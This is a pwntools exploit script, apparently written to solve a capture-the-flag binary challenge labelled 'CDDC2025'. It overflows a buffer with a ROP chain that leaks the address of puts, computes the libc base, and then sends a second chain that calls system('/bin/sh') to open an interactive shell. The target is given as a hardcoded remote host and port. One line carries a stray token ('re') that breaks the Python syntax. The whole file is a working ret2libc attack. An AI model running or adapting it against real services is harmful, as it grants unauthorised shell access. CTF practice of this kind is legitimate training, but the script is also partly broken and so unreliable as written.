from pwn import *

# --- Context Setup ---
exe_path = './TH3BRAV3'
elf = context.binary = ELF(exe_path, checksec=False)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
context.log_level = 'debug' # Keep debug for verification

# --- Connection ---
if args.GDB:
    p = gdb.debug(exe_path, gdbscript='''
        continue
    ''', aslr=False, stdin=PTY, stdout=PTY)
elif args.REMOTE:
    p = remote('52.76.13.43', 8121) # Replace if needed
else:
    p = process(exe_path, stdin=PTY, stdout=PTY)

# --- Exploit ---
offset = 12

puts_plt = elf.plt['puts']
puts_got = elf.got['puts'] re
main_func_addr = elf.symbols['_start']

log.info(f"Offset to EIP: {offset}")
log.info(f"puts@plt: {hex(puts_plt)}")
log.info(f"puts@got: {hex(puts_got)}")
log.info(f"Return address after leak: {hex(main_func_addr)}")

rop_chain_1 = flat([
    b'A' * offset,
    puts_plt,
    main_func_addr,
    puts_got
])

if not args.REMOTE and not args.GDB:
    initial_banner = p.recvuntil(b"==> ")
    log.info(f"Consumed initial banner locally: {initial_banner!r}")
elif args.REMOTE: # For remote, explicitly wait for prompt
    p.recvuntil(b"==> ")

log.info("Sending ROP chain 1")
p.sendline(rop_chain_1)

log.info("Waiting for output after ROP1 to parse leak...")
p.recvuntil(b"(hint: secrets likes to hide in plain sight, Output is not always innocent.)\n")

# CORRECTED LEAK PARSING:
# Consume the unexpected extra newline observed in the debug log
extra_newline = p.recv(1)
if extra_newline != b'\n':
    log.error(f"Expected an extra newline before leak bytes, but got: {extra_newline!r}")
    log.info("Debug info before exit:")
    try: log.info(f"Remaining buffer: {p.recvall(timeout=0.5)!r}")
    except: pass
    p.interactive()
    exit()
log.info(f"Consumed extra newline: {extra_newline!r}")

# Now read the 4 bytes of the leaked address
leaked_puts_raw = p.recv(4)
if len(leaked_puts_raw) != 4:
    log.error(f"Failed to read 4 bytes for leaked address. Got: {leaked_puts_raw!r}")
    log.info("Debug info before exit:")
    try: log.info(f"Remaining buffer: {p.recvall(timeout=0.5)!r}")
    except: pass
    p.interactive()
    exit()

# Consume the newline that puts itself added after the 4 address bytes
newline_from_puts = p.recvline()
if newline_from_puts.strip() != b'':
    log.warning(f"Expected only a newline from puts after address, got: {newline_from_puts!r}")
# END CORRECTED LEAK PARSING

leaked_puts_addr = u32(leaked_puts_raw)
log.success(f"Leaked puts@libc: {hex(leaked_puts_addr)}")

libc.address = leaked_puts_addr - libc.symbols['puts']
log.success(f"Calculated libc base: {hex(libc.address)}")

system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
exit_addr = libc.symbols['exit']

log.info(f"system@libc: {hex(system_addr)}")
log.info(f"'/bin/sh'@libc: {hex(binsh_addr)}")
log.info(f"exit@libc: {hex(exit_addr)}")

rop_chain_2 = flat([
    b'B' * offset,
    system_addr,
    exit_addr,
    binsh_addr
])

log.info("Waiting for the second prompt '==>'")
p.recvuntil(b"CDDC2025: Welcome, brave challenger!")
p.recvuntil(b"Legend says the flag lies beyond...\n")
p.recvuntil(b"==> ")

log.info("Sending ROP chain 2")
p.sendline(rop_chain_2)

log.info("Switching to interactive mode for shell")
p.interactive()